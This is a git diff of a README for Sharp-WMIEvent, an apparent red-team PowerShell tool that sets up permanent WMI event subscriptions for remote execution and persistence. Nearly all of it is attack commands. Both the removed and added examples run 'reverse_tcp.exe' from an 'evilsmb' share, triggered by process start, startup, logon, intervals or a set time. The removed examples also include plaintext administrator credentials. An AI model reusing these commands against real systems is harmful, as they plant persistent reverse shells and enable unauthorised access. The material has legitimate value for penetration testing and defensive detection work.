@@ -12,34 +12,50 @@ Hackers can use the capabilities of WMI to deploy permanent event subscriptions 
 
 ## Usage
 
-Execute attack payload in SMB share.
-
 ```powershell
-PS C:\Users\Administrator> Import-Module .\Sharp-WMIEvent.ps1
-
-PS C:\Users\Administrator> Sharp-WMIEvent -ConsumerType Command -ComputerName 10.10.10.19 -Domain Domain.com -Username Administrator -Password Admin@123 -Command "C:\Windows\System32\cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName Test -ConsumerName Test
-[+] Creating The WMI Event Filter
-[+] Creating The WMI Event Consumer
-[+] Creating The WMI Event Filter And Event Consumer Binding
-[+] Triggering The Target Process
-[+] Cleaning Up The Event Subscriptions
+Sharp-WMIEvent [[-ComputerName] <String>] [[-Domain] <String>] [[-Username] <String>] [[-Password] <String>] [[-Fil
+    terName] <String>] [[-ConsumerName] <String>] [[-Trigger] <String>] [[-ProcessName] <String>] [[-ScriptPath] <Strin
+    g>] [[-Command] <String>] [[-IntervalPeriod] <Int32>] [[-ExecutionTime] <DateTime>] [<CommonParameters>]
 ```
 
-Execute the attack payload in the local payload.js script file.
+## EXAMPLE
+
+This command will create a permanent WMI event subscription on the target host specified by -ProcessName and run the script when the svchost.exe process starts.
 
 ```powershell
-PS C:\Users\Administrator>Import-Module .\Sharp-WMIEvent.ps1
+Sharp-WMIEvent -Trigger ProcessStart -ProcessName svchost.exe -ComputerName <IP/Hostname> -Domain <Domain Name> -Username <Username> -Password <Password> -ScriptPath "C:\Sharp-WMIEvent\payload.js" -FilterName <Filter Name> -ConsumerName <Consumer Name>
+```
 
-PS C:\Users\Administrator>Sharp-WMIEvent -ConsumerType JScript -ComputerName 10.10.10.19 -Domain Domain.com -Username Administrator -Password Admin@123 -ScriptPath C:\Folder\Sharp-WMIEvent\payload.js -FilterName Test -ConsumerName Test
-[+] Creating The WMI Event Filter
-[+] Creating The WMI Event Consumer
-[+] Creating The WMI Event Filter And Event Consumer Binding
-[+] Triggering The Target Process
-[+] Cleaning Up The Event Subscriptions
+This command will create a permanent WMI event subscription on the target host specified by -ProcessName and execute the command when the svchost.exe process starts.
+
+```powershell
+Sharp-WMIEvent -Trigger ProcessStart -ProcessName svchost.exe -ComputerName <IP/Hostname> -Domain <Domain Name> -Username <Username> -Password <Password> -Command "cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName <Filter Name> -ConsumerName <Consumer Name>
+```
+
+This command will create a permanent WMI event subscription and execute command within 5 minutes of system startup.
+
+```powershell
+Sharp-WMIEvent -Trigger Startup -Command "cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName <Filter Name> -ConsumerName <Consumer Name>
+```
+
+This command will create a permanent WMI event subscription and execute the command when the user logs in.
+
+```powershell
+Sharp-WMIEvent -Trigger UserLogon -Command "cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName <Filter Name> -ConsumerName <Consumer Name>
+```
+
+This command will create a permanent WMI event subscription and execute the command every 60 seconds.
+
+```powershell
+Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -Command "cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName <Filter Name> -ConsumerName <Consumer Name>
+```
+
+This command will create a permanent WMI event subscription and execute the command at 08:00:00.
+
+```powershell
+Sharp-WMIEvent -Trigger Timed -ExecutionTime '08:00:00' -Command "cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName <Filter Name> -ConsumerName <Consumer Name>
 ```
 
 ## Link
 
 https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/
-
-https://github.com/lengjibo/RedTeamTools/blob/master/windows/WMIShell
